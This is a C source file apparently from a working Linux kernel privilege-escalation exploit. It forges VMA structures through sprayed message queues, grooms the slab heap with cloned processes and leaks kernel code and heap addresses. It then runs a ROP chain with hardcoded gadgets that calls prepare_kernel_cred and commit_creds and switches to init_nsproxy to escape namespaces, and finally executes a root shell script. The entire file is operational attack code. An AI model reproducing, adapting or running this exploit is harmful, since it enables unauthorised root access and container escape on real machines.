#include "../nolibc/nolibc.h"
#include "../consts/log.h"
#include "../consts/paging.h"
#include "../consts/stack.h"
#include "../consts/msg.h"
#include "../sys/msg.h"
#include "../sysutil/clone.h"
#include "../sysutil/mbarrier.h"
#include "nodes_decl.h"
#include "nodes_master_free_use.h"
#include "nodes_master_and_free.h"
#include "nodes_master_and_use.h"
#include <linux/wait.h>

#define ADDR_VICTIM ((void *)0x80000UL)
#define SIZE_VICTIM PAGE_SIZE

#define ADDR_GAP (ADDR_VICTIM - 1 * PAGE_SIZE)
#define SIZE_GAP PAGE_SIZE

#define ADDR_GUARD (ADDR_VICTIM - 2 * PAGE_SIZE)
#define SIZE_GUARD PAGE_SIZE

static int setup_maps(void)
{
	void *addr;

	addr = mmap(ADDR_VICTIM, SIZE_VICTIM, PROT_READ | PROT_WRITE,
		    MAP_ANONYMOUS | MAP_PRIVATE | MAP_GROWSDOWN |
			    MAP_FIXED_NOREPLACE,
		    -1, 0);
	if (addr == MAP_FAILED) {
		perror(L_ERROR
		       "[-] Cannot map upper pages for stack expansion");
		return -1;
	}

	addr = mmap(ADDR_GUARD, SIZE_GUARD,
		    PROT_READ | PROT_WRITE | MAP_EXECUTABLE,
		    MAP_ANONYMOUS | MAP_PRIVATE | MAP_GROWSDOWN |
			    MAP_FIXED_NOREPLACE,
		    -1, 0);
	if (addr == MAP_FAILED) {
		perror(L_ERROR
		       "[-] Cannot map lower pages for stack expansion");
		return -1;
	}

	return 0;
}

static void reset_maps(void)
{
	(void)munmap(ADDR_GAP, SIZE_GAP);
}

#define VMA_MSQNUM 2048
#define VMA_MSQKEY 1234

static int vma_msqids[VMA_MSQNUM];

static void __cleanup_vma_msq(int i)
{
	int retval;

	retval = msgctl(vma_msqids[i], IPC_RMID, NULL);
	if (retval < 0)
		perror(L_ERROR "[-] Cannot destory VMA message queues");
}

static void cleanup_vma_msq(void)
{
	int i;

	for (i = 0; i < VMA_MSQNUM; ++i)
		__cleanup_vma_msq(i);
}

static int __setup_vma_msq(int i)
{
	int retval;

	retval = msgget(VMA_MSQKEY + i, IPC_CREAT | 0600);
	if (retval < 0) {
		perror(L_ERROR
		       "[-] Cannot create message queues to forge VMA structures");
		return retval;
	}

	vma_msqids[i] = retval;

	return 0;
}

static int setup_vma_msq(void)
{
	int i, retval;

	for (i = 0; i < VMA_MSQNUM; ++i) {
		retval = __setup_vma_msq(i);
		if (retval < 0)
			goto err;
	}

	return 0;
err:
	for (--i; i >= 0; --i)
		__cleanup_vma_msq(i);
	return retval;
}

#define VMA_MSQTYP 1

static char vma_page[PAGE_SIZE];

static int __forge_evil_vma(int i)
{
	struct msg_hdr *hdr;
	int retval;

	hdr = (void *)&vma_page[KERNEL_MSGHDR_SIZE - USERSPACE_MSGHDR_SIZE];
	hdr->type = VMA_MSQTYP;

	retval = msgsnd(vma_msqids[i], hdr, PAGE_SIZE - KERNEL_MSGHDR_SIZE, 0);
	if (retval < 0) {
		perror(L_ERROR
		       "[-] Cannot send evil VMA structures to message queues");
		return retval;
	}

	return 0;
}

static int forge_evil_vma(void)
{
	int i, retval;

	for (i = 0; i < VMA_MSQNUM; ++i) {
		retval = __forge_evil_vma(i);
		if (retval < 0)
			return retval;
	}

	return 0;
}

#define NODE_NUM 256

static pid_t nodes[NODE_NUM];

static void __kill_node(pid_t pid, int sig)
{
	int retval;

	retval = kill(pid, sig);
	if (retval < 0)
		perror(L_ERROR "[-] Cannot kill nodes");
}

static void kill_node(int i, int sig)
{
	pid_t pid = nodes[i];

	if (!pid) {
		fputs(L_ERROR
		      "Internal error: Trying to kill an invalid node\n",
		      stderr);
		return;
	}

	__kill_node(pid, sig);
}

static void __wait_node(pid_t pid)
{
	int retval;

	retval = waitpid(pid, NULL, __WCLONE);
	if (retval < 0)
		perror(L_ERROR "[-] Cannot wait for nodes");
}

static void __clear_node(int i)
{
	nodes[i] = 0;
}

static void wait_node(int i)
{
	pid_t pid = nodes[i];

	if (!pid) {
		fputs(L_ERROR
		      "Internal error: Trying to wait for an invalid node\n",
		      stderr);
		return;
	}

	__wait_node(pid);
	__clear_node(i);
}

static void __teardown_node(pid_t pid)
{
	__kill_node(pid, SIGKILL);
	__wait_node(pid);
}

static void __teardown_node_at(int i)
{
	pid_t pid;

	pid = nodes[i];
	if (pid != 0) {
		__teardown_node(pid);
		__clear_node(i);
	}
}

static void teardown_nodes(void)
{
	int i;

	for (i = 0; i < NODE_NUM; ++i)
		__teardown_node_at(i);
}

static char node_free_stack[COMMON_STACK_SIZE] STACK_ALIGNED;

static int vma_create_node(int i)
{
	pid_t pid;

	pid = clone_new_vm(&run_node_free, node_free_stack, COMMON_STACK_SIZE);
	if (pid < 0) {
		perror(L_ERROR "[-] Cannot create the \"free\" node");
		return pid;
	}

	nodes[i] = pid;

	return 0;
}

static int setup_nodes(void)
{
	int i;
	int result;

	for (i = 0; i < NODE_NUM; ++i) {
		result = vma_create_node(i);
		if (result < 0)
			goto err;
	}

	return 0;
err:
	for (--i; i >= 0; --i)
		__teardown_node_at(i);

	return result;
}

#define OBJS_PER_SLAB 16

static void prepare_fengshui(void)
{
	int mod;
	int i;

	mod = (NODE_NUM - 1) % OBJS_PER_SLAB;

	for (i = NODE_NUM - 1; i >= 0; --i) {
		if (i % OBJS_PER_SLAB == mod)
			continue;

		kill_node(i, SIGKILL);
	}

	for (i = NODE_NUM - 1; i >= 0; --i) {
		if (i % OBJS_PER_SLAB == mod)
			continue;

		wait_node(i);
	}
}

#define LUCKY_TASK_ID 223

static int check_nodes(void)
{
	int i;

	for (i = 1; i < NODE_NUM; ++i) {
		if (nodes[i] == nodes[i - 1] + 1)
			continue;
		fprintf(stderr,
			L_ERROR
			"[-] Spaced PIDs (caused by background services?): "
			"[%d] = %d, [%d] = %d\n",
			i - 1, nodes[i - 1], i, nodes[i]);
		return -1;
	}

	return 0;
}

static int verify_healthcheck_state(void)
{
	if (healthcheck_state != HEALTHCHECK_DONE) {
		fputs(L_ERROR
		      "[-] Healthcheck failed: \"Use\" happens before \"free\", "
		      "please try to enlarge LONG_FILE_NAME_DEPTH\n",
		      stderr);
		return -1;
	}

	fputs(L_DONE "[+] Healcheck passed: \"Use\" happens after \"free\"\n",
	      stderr);
	return 0;
}

static int warn_healthcheck_state(void)
{
	if (healthcheck_state == HEALTHCHECK_DONE)
		return 0;

	fputs(L_ERROR
	      "[-] Healthcheck says \"use\" happens before \"free\", aborting\n",
	      stderr);
	return -1;
}

static int __do_exp(void)
{
	int retval;

	fprintf(stderr, L_DOING "[ ] Trying with free_timing_msec=%d\n",
		free_timing_msec);

	healthcheck_state = HEALTHCHECK_INIT;
	reset_maps();

	sched_yield();
retry:
	retval = setup_nodes();
	if (retval < 0)
		return retval;

	if (check_nodes() != 0) {
		teardown_nodes();
		sched_yield();
		goto retry;
	}

	prepare_fengshui();

	retval = waitpid(nodes[LUCKY_TASK_ID], NULL, __WCLONE | WSTOPPED);
	if (retval < 0)
		perror(L_ERROR "[-] Cannot wait for the \"free\" node");

	kill_node(LUCKY_TASK_ID, SIGCONT);
	wait_node(LUCKY_TASK_ID);

	teardown_nodes();

	if (free_timing_msec == 0)
		return verify_healthcheck_state();
	else
		return warn_healthcheck_state();
}

#define FREE_TIMING_INIT  50
#define FREE_TIMING_RATIO 5
#define FREE_TIMING_STEP  5

static int __do_first_exp(void)
{
	int retval;
	int msec;

	free_timing_msec = 0;
	retval = __do_exp();
	if (retval < 0)
		return retval;

	for (msec = FREE_TIMING_INIT;; msec += msec / FREE_TIMING_RATIO) {
		free_timing_msec = msec;
		retval = __do_exp();
		if (retval < 0)
			return retval;
		if (exploit_results[0] != 0)
			return 0;
	}
}

static int __do_next_exp(void)
{
	int retval;
	int msec, initial_timing;

	initial_timing = free_timing_msec;

	for (msec = 0;; msec += FREE_TIMING_STEP) {
		free_timing_msec = initial_timing + msec;
		retval = __do_exp();
		if (retval < 0)
			return retval;
		if (exploit_results[0] != 0)
			return 0;

		if (msec == 0 || msec > initial_timing)
			continue;

		free_timing_msec = initial_timing - msec;
		retval = __do_exp();
		if (retval < 0)
			return retval;
		if (exploit_results[0] != 0)
			return 0;
	}
}

static int do_exp(unsigned long target_address)
{
	exploit_address = target_address;
	stack_expansion_victim = ADDR_VICTIM - 1;

	exploit_results[0] = 0;

	if (free_timing_msec == 0)
		return __do_first_exp();
	else
		return __do_next_exp();
}

#define IDT_BASE_ADDR  0xfffffe0000000000ul
#define IDT_ENTRY_SIZE 16
#define IDT_ENTRY_NUM  256

#define IDT_LAST_ENTRY (IDT_BASE_ADDR + (IDT_ENTRY_NUM - 1) * IDT_ENTRY_SIZE)

static unsigned long leaked_code_addr;

static int __exp_leak_code(void)
{
	unsigned long v0, v1, v;
	int retval;

	retval = do_exp(IDT_LAST_ENTRY);
	if (retval < 0)
		return retval;

	v0 = exploit_results[0];
	v1 = exploit_results[1];
	v = (v0 & 0xFFFF) | ((v0 >> 32) & (0xFFFF0000)) | (v1 << 32);

	fprintf(stderr, L_DONE "[+] Leaked code address: %lx\n", v);
	leaked_code_addr = v;

	return 0;
}

#define __OFF_asm_sysvec_spurious_apic_interrupt 0xffffffff81e00cd0
#define __OFF_node_data				 0xffffffff82814ea0

static unsigned long leaked_heap_addr;

static int __exp_leak_heap(void)
{
	unsigned long v;
	int retval;

	v = leaked_code_addr - __OFF_asm_sysvec_spurious_apic_interrupt +
	    __OFF_node_data;
	retval = do_exp(v);
	if (retval < 0)
		return retval;

	v = exploit_results[0];

	fprintf(stderr, L_DONE "[+] Leaked heap address: %lx\n", v);
	leaked_heap_addr = v;

	return 0;
}

extern void get_shell(void);

asm(".section .rodata\n\t"
    "msg: .string \"" A_SUCC "[*] Got root! "
    "Run /tmp/exp/as_root.sh\\n" A_RESET "\"\n\t"
    "msg_end:\n\t"
    "\n\t"
    "sh_cmd: .string \"/tmp/exp/as_root.sh\"\n\t"
    "sh_arg: .quad sh_cmd\n\t"
    "        .quad 0\n\t"
    "\n\t"
    ".section .text\n\t"
    "get_shell:\n\t"
    "movq $1, %rax\n\t" /* __NR_write */
    "movq $2, %rdi\n\t" /* stderr */
    "leaq msg(%rip), %rsi\n\t"
    "movq $msg_end - msg, %rdx\n\t"
    "syscall\n\t"
    "movq $59, %rax\n\t" /* __NR_execve */
    "leaq sh_cmd(%rip), %rdi\n\t"
    "leaq sh_arg(%rip), %rsi\n\t"
    "xorq %rdx, %rdx\n\t"
    "syscall\n\t"
    "ud2\n\t");

static unsigned long page_kernel_addr;
static void *page_userspace_ptr;

static unsigned long kcode_base_addr;
static unsigned long curr_stack_offset;

static void __exp_rop_entry(void)
{
#define WR_ABS(off, val) \
	(*(unsigned long *)(page_userspace_ptr + (off)) = (val))
#define WR_REL(off, val)                                  \
	(*(unsigned long *)(page_userspace_ptr + (off)) = \
		 page_kernel_addr + (val))
#define WR_SYM(off, val)                                  \
	(*(unsigned long *)(page_userspace_ptr + (off)) = \
		 kcode_base_addr + (val))

	WR_REL(96 /* vma_area_struct->vm_ops */, -8 /* vm_ops */);

	WR_SYM(-8 /* vm_ops */ + 96 /* vma_ops->name */,
	       0xffffffff8122e544 /* movq %rbx, %rsi;
				   * movq %rbp, %rdi;
				   * call ffffffff82003260 <__x86_indirect_thunk_r13> */);

	WR_SYM(16 /* indirect jump: %r13 (vma_area_struct->mm) */,
	       0xffffffff81b828a4 /* pushq %rsi; jmp 46(%rsi) */);

	WR_SYM(46 /* indirect jump: 46(%rsi) */,
	       0xffffffff8195b260 /* popq %rsp; ret */);

	WR_SYM(0 /* stack(%rsp=%rdi): ret */,
	       0xffffffff8195b260 /* popq %rsp; ret */);

	WR_REL(8 /* stack(%rsp): popq %rsp */, 128 /* new stack */);

	curr_stack_offset = 128;

#define ST_ABS(val)                                                           \
	(*(unsigned long *)(page_userspace_ptr + curr_stack_offset) = (val)); \
	curr_stack_offset += 8
#define ST_REL(val)                                                   \
	(*(unsigned long *)(page_userspace_ptr + curr_stack_offset) = \
		 page_kernel_addr + curr_stack_offset + (val));       \
	curr_stack_offset += 8
#define ST_SYM(val)                                                   \
	(*(unsigned long *)(page_userspace_ptr + curr_stack_offset) = \
		 kcode_base_addr + (val));                            \
	curr_stack_offset += 8
}

static void __exp_rop_cred(void)
{
	ST_SYM(0xffffffff81021465 /* popq %rdi; ret */);

	ST_SYM(0xffffffff82814a40 /* init_task */);

	ST_SYM(0xffffffff8109ba00 /* prepare_kernel_cred */);

	ST_SYM(0xffffffff81021465 /* popq %rdi; ret */);

	ST_REL(24 /* %rsp + 24 */);

	ST_SYM(0xffffffff814219af /* movq %rax, (%rdi);
				   * jmp ffffffff82003300 <__x86_return_thunk> */);

	ST_SYM(0xffffffff81021465 /* popq %rdi; ret */);

	ST_ABS(0xAABBCCDD /* dummy value */);

	ST_SYM(0xffffffff8109b760 /* commit_creds */);
}

static void __exp_rop_nsproxy(void)
{
	ST_SYM(0xffffffff81021465 /* popq %rdi; ret */);

	ST_ABS(1 /* pid */);

	ST_SYM(0xffffffff81094140 /* find_task_by_vpid */);

	ST_SYM(0xffffffff81021465 /* popq %rdi; ret */);

	ST_REL(24 /* %rsp + 24 */);

	ST_SYM(0xffffffff814219af /* movq %rax, (%rdi);
				   * jmp ffffffff82003300 <__x86_return_thunk> */);

	ST_SYM(0xffffffff81021465 /* popq %rdi; ret */);

	ST_ABS(0xAABBCCDD /* dummy value */);

	ST_SYM(0xffffffff810aa0ed /* popq %rsi; ret */);

	ST_SYM(0xffffffff828517a0 /* init_nsproxy */);

	ST_SYM(0xffffffff81099cb0 /* switch_task_namespaces */);
}

static void __exp_rop_unlock(void)
{
	ST_SYM(0xffffffff81123074 /* popq %rax; ret */);

	ST_SYM(0xffffffff81123074 /* popq %rax; ret */);

	ST_SYM(0xffffffff81002cf4 /* movq %rbp, %rdi;
				   * call 0xffffffff820030c0 <__x86_indirect_thunk_array> */);

	ST_SYM(0xffffffff812b1240 /* m_stop */);
}

static void __exp_rop_exit(void)
{
	ST_SYM(0xffffffff81e00ed0 /* swapgs_restore_regs_and_return_to_usermo */);

	ST_ABS(0 /* r15 */);
	ST_ABS(0 /* r14 */);
	ST_ABS(0 /* r13 */);
	ST_ABS(0 /* r12 */);
	ST_ABS(0 /* rbp */);
	ST_ABS(0 /* rbx */);
	ST_ABS(0 /* r11 */);
	ST_ABS(0 /* r10 */);
	ST_ABS(0 /* r9 */);
	ST_ABS(0 /* r8 */);
	ST_ABS(0 /* rax */);
	ST_ABS(0 /* rcx */);
	ST_ABS(0 /* rdx */);
	ST_ABS(0 /* rsi */);
	ST_ABS(0 /* rdi */);

	ST_ABS(0 /* ??? */);
	ST_ABS((unsigned long)&get_shell /* rip */);
	ST_ABS(0x33 /* cs */);
	ST_ABS(0x246 /* eflags */);
	ST_ABS(0xCCCC1234 /* rsp */);
	ST_ABS(0x2b /* ss */);
}

static void __exp_prep_rop(void)
{
	kcode_base_addr =
		leaked_code_addr - __OFF_asm_sysvec_spurious_apic_interrupt;

	__exp_rop_entry();

	__exp_rop_cred();

	__exp_rop_nsproxy();

	__exp_rop_unlock();

	__exp_rop_exit();
}

#define ROP_OFFSET 0x100

static int __exp_kern_exec(void)
{
	int retval;

	page_kernel_addr = (leaked_heap_addr & ~PAGE_MASK) + ROP_OFFSET;
	page_userspace_ptr = &vma_page[ROP_OFFSET];

	__exp_prep_rop();

	retval = forge_evil_vma();
	if (retval < 0)
		return retval;

	retval = do_exp(page_kernel_addr);
	if (retval < 0)
		return retval;

	return 0;
}

#define PAUSE_MSEC 200

static int do_exploiting(void)
{
	int retval;

	msleep(PAUSE_MSEC);
	retval = __exp_leak_code();
	if (retval < 0)
		return retval;

	msleep(PAUSE_MSEC);
	retval = __exp_leak_heap();
	if (retval < 0)
		return retval;

	setup_nodes();
	teardown_nodes();
	synchronize_rcu();

	msleep(PAUSE_MSEC);
	retval = __exp_kern_exec();
	if (retval < 0)
		return retval;

	return 0;
}

static int run_node_master(void)
{
	int retval;

	retval = setup_maps();
	if (retval < 0)
		return retval;

	retval = setup_vma_msq();
	if (retval < 0)
		return retval;

	retval = do_exploiting();

	cleanup_vma_msq();

	return retval;
}
